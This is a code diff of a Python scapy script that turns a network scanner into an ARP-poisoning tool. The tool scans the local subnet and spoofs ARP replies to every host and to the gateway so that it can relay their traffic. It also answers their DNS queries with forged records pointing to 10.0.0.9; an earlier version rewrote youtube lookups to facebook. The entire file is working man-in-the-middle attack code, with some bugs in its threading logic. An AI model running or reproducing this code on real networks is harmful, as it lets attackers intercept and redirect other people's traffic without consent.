@@ -1,132 +1,178 @@
-import scapy.all as scapy
+from scapy.all import *
+from scapy.layers.dns import DNSQR, DNSRR, DNS
+from scapy.layers.inet import IP, ICMP, UDP
+from scapy.layers.l2 import ARP, getmacbyip, Ether
 import time
 import netifaces
-import ipaddress
-import socket
-import _thread
+import threading
 
-class NetworkScanner:
+
+# op=2 means the flag 2 of arp that repleis to arp brodcast requests
+class ARPPoison():
+
     def __init__(self):
-        self.target_web = b'www.youtube.com'
-        self.new_web = b'www.facebook.com'
-        self.my_ip = self.get_ip_address()
-        self.my_mac = self.get_mac(self.my_ip)
-        self.gateway_ip = self.get_default_gateway()
-        self.router_mac = self.get_mac(self.gateway_ip)
-        self.subnet_mask = "255.255.248.0"
-        self.cidr_notation = self.calculate_cidr_notation(self.gateway_ip)
+        self.gateway = self.gateway_info()
+        self.gateway_mac = ""
+        self.My_Mac = get_if_hwaddr(conf.iface)
+        self.targets = self.discover_net()
+        self.subnet_mask = 0
+        self.lock = threading.Lock()
+        self.threads = []
+        self.spoofing_active = False
 
-    def get_ip_address(self):
+    def gateway_info(self):
+        gateways = netifaces.gateways()
+        default_gateway = gateways.get(netifaces.AF_INET, [])
+
+        if default_gateway:
+            gateway_info = default_gateway[0]
+            gateway_ip = gateway_info[0]
+            interface_addresses = netifaces.interfaces()
+
+            for interface in interface_addresses:
+                interface_info = netifaces.ifaddresses(interface).get(netifaces.AF_INET, [])
+                if interface_info:
+                    subnet_mask = interface_info[0]['netmask']
+                    break
+            else:
+                subnet_mask = None
+        else:
+            gateway_ip = None
+            subnet_mask = None
+        print(gateway_ip, subnet_mask)
+        self.subnet_mask = subnet_mask
+        return gateway_ip
+
+    def discover_net(self):
+        hosts = []
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            ip_address = s.getsockname()[0]
-            s.close()
-            return ip_address
-        except socket.error:
-            return "Could not get IP address"
+            # Convert subnet mask to CIDR notation
+            subnet_prefix = sum(bin(int(bit)).count('1') for bit in self.subnet_mask.split('.'))
+            ip_range = f"{self.gateway}/{subnet_prefix}"
+            print(f"Scanning IP range: {ip_range}")
 
-    def get_mac(self, ip):
-        #arp_request = scapy.ARP(pdst=ip)
-        #broadcast =
-        arp_request_broadcast = scapy.ARP(pdst=ip) / scapy.Ether(dst=)
-        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-        try:
-            return answered_list[0][1].hwsrc
-        except Exception as e:
-            return f"An error occurred: {e}"
-
-    def discover_devices(self, ip_range):
-        arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range)
-        result = scapy.srp(arp_request, timeout=15, verbose=0)[0]
-        devices = []
-        for sent, received in result:
-            devices.append(received.psrc)
-            print(f"IP: {received.psrc}, MAC: {received.hwsrc}")
-        return devices
-
-    def spoof(self, target_ip, spoof_ip):
-        target_mac = self.get_mac(target_ip)
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        scapy.send(packet, verbose=False)
-
-    def restore(self, destination_ip, source_ip):
-        destination_mac = self.get_mac(destination_ip)
-        source_mac = self.get_mac(source_ip)
-        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-        scapy.send(packet, count=4, verbose=False)
-
-    def get_default_gateway(self):
-        try:
-            gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
-            Router_IP = gateway
-            print("Your router's IP address is: " + Router_IP)
-            return Router_IP
-        except KeyError:
-            return "Default gateway not found"
-        except Exception as e:
-            return f"An error occurred: {e}"
-
-    def calculate_cidr_notation(self, router_ip):
-        router_ip_numeric = sum(int(octet) * (256 ** (3 - i)) for i, octet in enumerate(router_ip.split('.')))
-        subnet_mask_numeric = sum(int(octet) * (256 ** (3 - i)) for i, octet in enumerate(self.subnet_mask.split('.')))
-        starting_ip_numeric = router_ip_numeric & (subnet_mask_numeric | ~subnet_mask_numeric)
-        subnet_bits = bin(subnet_mask_numeric).count('1')
-        cidr_notation = f"{router_ip}/{subnet_bits}"
-        print("Your CIDR is: " + cidr_notation)
-        return cidr_notation
-
-    def thread_ing(self, target_ip):
-        while True:
-            self.spoof(target_ip, self.gateway_ip)
-            self.spoof(self.gateway_ip, target_ip)
-            if time.sleep(40):
-                break
-
-    def i_filter(self, pack):
-        return scapy.DNS in pack and scapy.DNSQR in pack
-
-    def modify(self, pack):
-        if pack[scapy.DNSQR].qname == self.target_web:
-            print(pack)
-        pack[scapy.DNSQR].qname = self.new_web
-        pack[scapy.Ether].hwdst = self.router_mac
-        scapy.send(pack, verbose=False)
-
-    def sniffing(self, target_ip):
-        while True:
-            scapy.sniff(lfilter=self.i_filter, prn=self.modify)
-            if time.out(40):
-                break
-
-    def run(self):
-        try:
-            packets_sent_count = 0
-            while True:
-                if _thread is open:
-                    _thread.exit()
-                if "/" not in self.cidr_notation:
-                    print("Invalid IP range format. Please use CIDR notation (e.g., '192.168.1.0/24')")
+            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
+            answered, unanswered = srp(arp_request, timeout=2, inter=0.1)
+            for packet in answered:
+                ip = packet[1].psrc
+                mac = packet[1].hwsrc
+                if ip != self.gateway:
+                    hosts.append([ip, mac])
                 else:
-                    discovered_devices = self.discover_devices(self.cidr_notation)
-                    if self.my_ip in discovered_devices:
-                        discovered_devices.remove(self.my_ip)
-                    if self.gateway_ip in discovered_devices:
-                        discovered_devices.remove(self.gateway_ip)
-                    print(f"\nDiscovered {len(discovered_devices)} devices on the network.")
-                k = len(discovered_devices) - 1
-                while k != -1:
-                    _thread.start_new_thread(self.thread_ing, (discovered_devices[k],))
-                    _thread.start_new_thread(self.sniffing, (discovered_devices[k],))
-                    k -= 1
-                time.sleep(20)
+                    self.gateway_mac = mac
+                print(f"IP: {ip} - MAC: {mac}")
+        except ValueError as e:
+            print(f"Error: {e}")
+        targets = {ip: mac for ip, mac in hosts}
+        print(targets)
+        return targets
 
+    def spoof(self, target_ip, target_mac, spoof_ip):
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        send(packet, verbose=False)
+
+    def restore(self, destination_ip, destination_mac, source_ip, source_mac):
+        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+        send(packet, verbose=False)
+
+    def dns_filter(self, packet):
+        # checks if the packet is a DNS packet with type "A" or type "PTR" dns_conditions
+        cond = DNS in packet and packet[DNS].opcode == 0 and UDP in packet and packet[UDP].dport == 53
+        if not cond:
+            return False
+
+        name = packet[DNSQR].qname.decode()
+        excluded_websites = ["google", "ssl", "beacons", "widgetdata", "api"]
+        qtype_conditions = [1, 12, 28]  # DNS query types to filter
+
+        if packet[DNSQR].qtype in qtype_conditions and \
+                not any(excluded_site in name for excluded_site in excluded_websites):
+            return True
+        else:
+            return False
+
+    def sniff_packets(self,target):
+        while self.spoofing_active:
+            sniff(count=1, lfilter=self.filter_check_packet, prn =self.change_packets)
+
+    def filter_check_packet(self, packet):
+        # Check if the packet has IP and Ethernet layers
+        if IP not in packet or Ether not in packet:
+            return False
+        # Check if the destination MAC address matches the machine's MAC address
+        if packet[Ether].dst != self.My_Mac:
+            return False
+        # Check if the packet is from the gateway and destined for a target IP
+        if packet[Ether].src == self.gateway_mac and packet[IP].dst in self.targets:
+            return True
+        # Check if the packet is from a target IP
+        if packet[IP].src in self.targets:
+            return True
+        # If none of the conditions are met, filter out the packet
+        return False
+
+
+    def change_packets(self, packet):
+        try:
+            if self.dns_filter(packet) == True:
+                print("awfionawfa")
+                print(f"dns!!! ----->>> {packet[DNSQR].qname}")
+                udp_part = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
+                dns_response = DNS(id=packet[DNS].id, qr=1, qd=packet[DNSQR],
+                                  an=DNSRR(rrname=packet[DNSQR].qname, rdata="10.0.0.9", ttl=128))
+                response_packet = Ether(dst=packet[Ether].src) / IP(dst=packet[IP].src,
+                                                                      src=packet[IP].dst) / udp_part / dns_response
+                print("b")
+                send(response_packet)
+
+            # forwards the packet
+            elif packet[IP].src in self.targets:
+                packet[Ether].dst = self.gateway_mac
+                packet[Ether].src = self.My_Mac
+                print("a")
+                send(packet)
+            elif packet[Ether].src == self.gateway_mac:
+                packet[Ether].dst = self.targets[packet[IP].dst]
+                packet[Ether].src = self.My_Mac
+                print("a")
+                send(packet)
+
+        except Exception as e:
+            raise (e)
+            pass
+
+    def start(self):
+        for target in self.targets:
+            thread = threading.Thread(target=self.poison_target, args=(target,))
+
+            self.threads.append(thread)
+            thread.start()
+
+        try:
+            while True:
+                time.sleep(1.5)
         except KeyboardInterrupt:
-            print("\n[+] Detected CTRL + C ... Resetting ARP tables ...")
-            self.restore(discovered_devices[k], self.gateway_ip)
-            self.restore(self.gateway_ip, discovered_devices[k])
+            self.stop_poisoning()
 
-# Usage
-if __name__ == "__main__":
-    scanner = NetworkScanner()
-    scanner.run()
+    def poison_target(self, target):
+        try:
+            self.spoofing_active = True
+            self.sniff_packets(target)
+            while self.spoofing_active:
+                with self.lock:
+                    self.spoof(target[0], target[1], self.gateway)
+                    self.spoof(self.gateway, self.gateway_mac, target[0])
+                    time.sleep(1.5)
+        except KeyboardInterrupt:
+            self.restore(self.gateway, self.gateway_mac, target[0], target[1])
+            self.restore(target[0], target[1], self.gateway, self.gateway_mac)
+
+
+    def stop_poisoning(self):
+        for thread in self.threads:
+            thread.join()
+
+
+if __name__ == '__main__':
+    a = ARPPoison()
+    a.start()
